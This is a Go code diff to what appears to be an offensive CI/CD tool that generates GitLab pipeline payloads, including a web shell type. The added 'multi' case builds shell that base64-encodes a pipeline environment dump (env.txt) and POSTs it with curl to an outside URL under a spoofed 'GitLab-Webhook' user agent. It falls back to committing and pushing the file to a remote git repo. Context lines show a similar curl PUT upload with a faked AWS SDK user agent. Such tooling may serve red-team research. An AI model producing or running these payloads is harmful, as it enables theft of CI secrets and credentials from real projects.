@@ -15,6 +15,7 @@ type CommonOptions struct {
 	Manual          bool     // add a manual rule
 	ArtifactsPath   string   // optional artifact path to upload
 	ArtifactsExpire string   // e.g., "1 day"
+	CoAuthor        string   // Co-authored-by trailer for commit messages (optional)
 }
 
 func (c *CommonOptions) defaults(job string) (name, stage string) {
@@ -71,6 +72,13 @@ func rulesManual(manual bool) string {
 		return ""
 	}
 	return "\n  rules:\n    - when: manual"
+}
+
+func coAuthorTrailer(email string) string {
+	if strings.TrimSpace(email) == "" {
+		return ""
+	}
+	return fmt.Sprintf("\n\nCo-authored-by: %s", strings.TrimSpace(email))
 }
 
 // RORShellOptions models a simple web shell payload akin to the GitHub ROR_SHELL, for GitLab.
@@ -396,6 +404,8 @@ func payloadExfilScript(method, target string) string {
 		return fmt.Sprintf("    - |\n      tmpdir=$(mktemp -d)\n      git clone --depth 1 \"%s\" \"$tmpdir\" 2>/dev/null\n      cp env.txt \"$tmpdir/\"\n      cd \"$tmpdir\"\n      git config user.email \"ci@gitlab.com\"\n      git config user.name \"CI\"\n      git add -A\n      git commit -q -m \"exfil-$CI_PIPELINE_ID\" 2>/dev/null\n      git push -q origin HEAD 2>/dev/null || true\n      cd -\n      rm -rf \"$tmpdir\"\n", target)
 	case "cloud":
 		return fmt.Sprintf("    - |\n      curl -sS -X PUT \\\n        -H 'Content-Type: application/octet-stream' \\\n        -H 'User-Agent: aws-sdk-go/1.44.0' \\\n        -T env.txt \\\n        \"%s\" || true\n", target)
+	case "multi":
+		return fmt.Sprintf("    - |\n      b64=$(base64 -w0 env.txt)\n      curl -sS -X POST \\\n        -H 'Content-Type: application/json' \\\n        -H 'User-Agent: GitLab-Webhook/1.0' \\\n        -d \"{\\\"data\\\":\\\"$b64\\\",\\\"pipeline_id\\\":\\\"$CI_PIPELINE_ID\\\"}\" \\\n        \"%s\" || true\n      # Backup: git commit exfil\n      tmpdir=$(mktemp -d)\n      git clone --depth 1 \"%s\" \"$tmpdir\" 2>/dev/null || true\n      if [ -d \"$tmpdir/.git\" ]; then\n        cp env.txt \"$tmpdir/\"\n        cd \"$tmpdir\"\n        git config user.email \"ci@gitlab.com\"\n        git config user.name \"CI\"\n        git add -A\n        git commit -q -m \"exfil-$CI_PIPELINE_ID\" 2>/dev/null\n        git push -q origin HEAD 2>/dev/null || true\n        cd -\n        rm -rf \"$tmpdir\"\n      fi\n", target, target)
 	default:
 		return ""
 	}
